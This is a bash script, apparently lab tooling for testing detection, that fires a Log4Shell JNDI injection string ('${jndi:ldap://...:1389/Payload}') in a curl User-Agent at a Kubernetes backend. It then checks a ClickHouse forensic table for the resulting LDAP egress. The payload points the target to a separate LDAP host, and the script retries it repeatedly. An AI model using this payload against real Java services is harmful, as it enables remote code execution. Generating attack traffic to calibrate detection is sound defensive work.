#!/usr/bin/env bash

# Copyright 2018- The Pixie Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

set -uo pipefail
NS=${NS:-java-poc}
ANS=${ANS:-a-ns}
JNDI_HOST=${JNDI_HOST:-a.$ANS.svc.cluster.local}
JNDI='${jndi:ldap://'"$JNDI_HOST"':1389/Payload}'
RESTART=${RESTART:-1}
MAXTRIES=${MAXTRIES:-5}
FIRES=${FIRES:-15}
CHPOD=${CHPOD:-chi-forensic-soc-db-soc-cluster-0-0-0}
chq(){ kubectl -n clickhouse exec "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
ldap_count(){ chq "SELECT count() FROM forensic_db.conn_stats WHERE remote_port=1389 AND time_ > now()-INTERVAL 5 MINUTE"; }


kubectl -n "$ANS" rollout status deploy/ldap --timeout=60s >/dev/null 2>&1 \
  || { echo "FATAL: (LDAP :1389) not ready — bring it up before backend"; exit 1; }
echo " ready (LDAP :1389) — #140 a-before-backend satisfied; JNDI host=$JNDI_HOST"

for try in $(seq 1 "$MAXTRIES"); do
  if [ "$RESTART" = 1 ]; then
    echo "[try $try] delete backend pod → fresh JVM (clears negative-DNS cache)"
    kubectl -n "$NS" delete pod -l app=backend --wait=true >/dev/null 2>&1
    kubectl -n "$NS" rollout status deploy/backend --timeout=120s >/dev/null 2>&1
    sleep 12  
  fi
  BIP=$(kubectl -n "$NS" get svc backend -o jsonpath='{.spec.clusterIP}' 2>/dev/null)
  BPORT=$(kubectl -n "$NS" get svc backend -o jsonpath='{.spec.ports[0].port}' 2>/dev/null)
  before=$(ldap_count)
  echo "[try $try] fire JNDI at backend $BIP:$BPORT (x$FIRES)"
  for _ in $(seq 1 "$FIRES"); do
    kubectl -n "$ANS" exec deploy/a -- curl -s -m5 -A "$JNDI" "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true
    sleep 0.5
  done
  sleep 40   # settle: LDAP egress lands in conn_stats
  after=$(ldap_count)
  echo "[try $try] backend->:1389 LDAP egress (last5m): before=${before:-?} after=${after:-?}"
  if [ "${after:-0}" -gt "${before:-0}" ]; then
    echo "SIGNAL CONFIRMED — backend->:1389 LDAP egress generated on try $try (host=$JNDI_HOST)."
    echo "Downstream now has signal: R0005 (DNS) + ldap-egress for DX calibration."
    exit 0
  fi
  echo "[try $try] NOT fired (literal \${jndi} in backend log = java didn't expand) — retrying with fresh JVM"
  RESTART=1
done
echo "FAILED to confirm LDAP egress after $MAXTRIES tries."
echo "Check: backend app log shows 'ua=\${jndi:...}' LITERAL (not expanded) ⇒ java lookups not evaluating;"
exit 2
